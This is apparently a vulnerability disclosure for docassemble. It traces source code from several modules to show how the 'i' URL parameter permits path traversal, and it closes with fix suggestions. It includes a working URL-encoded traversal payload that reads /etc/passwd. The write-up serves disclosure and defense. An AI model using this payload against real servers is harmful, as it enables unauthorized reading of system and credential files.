# Unauthorized access through URL manipulation
​	Unauthorized access still exists in the new version. In order to prove the cause of the vulnerability, I gave my understanding of the source code.

```python
# server.py

@app.route(index_path, methods=['POST', 'GET'])
def index(action_argument=None, refer=None):
    ...
    if 'i' not in request.args and 'state' in request.args:
        try:
            yaml_filename = re.sub(r'\^.*', '', from_safeid(request.args['state']))
        except:
            yaml_filename = guess_yaml_filename()
    else:
        yaml_filename = request.args.get('i', guess_yaml_filename())
        ...
        
# backend.py
def guess_yaml_filename():
    yaml_filename = None
    if 'i' in session and 'uid' in session:  # TEMPORARY
        yaml_filename = session['i']
    if 'sessions' in session:
        for item in session['sessions']:
            yaml_filename = item
            break
    return yaml_filename
```

​	As long as the i parameter appears in the query parameter, it will try to read the i parameter. If the value of the i parameter is None, the corresponding file name will be obtained from i and uid in the session.

```python
# server.py
@app.route(index_path, methods=['POST', 'GET'])
def index(action_argument=None, refer=None):
    ...
    if 'i' not in request.args and 'state' in request.args:
        try:
            yaml_filename = re.sub(r'\^.*', '', from_safeid(request.args['state']))
        except:
            yaml_filename = guess_yaml_filename()
    else:
        yaml_filename = request.args.get('i', guess_yaml_filename())
    ...
		else:
            yaml_filename = re.sub(r':([^\/]+)$', r':data/questions/\1', yaml_filename)
            docassemble.base.functions.this_thread.current_info['yaml_filename'] = yaml_filename
        show_flash = False
        interview = docassemble.base.interview_cache.get_interview(yaml_filename)
```


​	Then a substitution will be attempted, replacing parameter values starting with "/" with ":data/questions/", Then the docassemble.base.interview_cache.get_interview method will be called

```python
# interview_cache.py
def get_interview(path):
    if path is None:
        raise DAException("Tried to load interview source with no path")
    if cache_valid(path):
        the_interview = cache[path]['interview']
        the_interview.from_cache = True
    else:
        interview_source = docassemble.base.parse.interview_source_from_string(path)
        interview_source.update()
        the_interview = interview_source.get_interview()
        the_interview.from_cache = False
        cache[interview_source.path] = {'index': interview_source.get_index(), 'interview': the_interview, 'source': interview_source}
    return the_interview

def cache_valid(questionPath):
    if questionPath in cache and cache[questionPath]['index'] == cache[questionPath]['source'].get_index():
        return True
    return False
```


​	The current user is not logged in, so there is no cache. The branch in else will be executed, and the docassemble.base.parse.interview_source_from_string method will be executed.

```python
# parse.py
def interview_source_from_string(path, **kwargs):
    if path is None:
        raise DAError("Passed None to interview_source_from_string")
    # logmessage("Trying to find " + path)
    path = re.sub(r'(docassemble.playground[0-9]+[^:]*:)data/questions/(.*)', r'\1\2', path)
    for the_filename in question_path_options(path):
        if the_filename is not None:
            new_source = InterviewSourceFile(filepath=the_filename, path=path)
            if new_source.update(**kwargs):
                return new_source
    raise DANotFoundError("Interview " + str(path) + " not found")
```


​	The branch will be judged based on whether the file exists. If the file does not exist, DANotFoundError("Interview " + str(path) + " not found") will be thrown. If the file exists, an object will be instantiated based on the file path.

```	python
def filename_invalid(filename):
    if '../' in filename or filename.startswith('/'):
        return True
    if re.search(r'[^A-Za-z0-9\_\.\-\/ ]', filename):
        return True
```


​	Although parameter values starting with "/" have been filtered, the file content can still be accessed by constructing the following payload

```http
?i=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```


​	I installed it through the docker installation method recommended on the official website.

>docker run -d -p 80:80 -p 443:443 --restart always --stop-timeout 600 jhpyle/docassemble


​	This is a test of the latest version I downloaded in docker

![8b3ca76876c7b5b656825a8a3103a3e](https://github.com/thedarknessdied/docassemble/blob/main/8b3ca76876c7b5b656825a8a3103a3e.png)

##  suggestion:

1. Filter special characters, such as "./", "../"
2. The obtained parameters are first decoded by the URL.
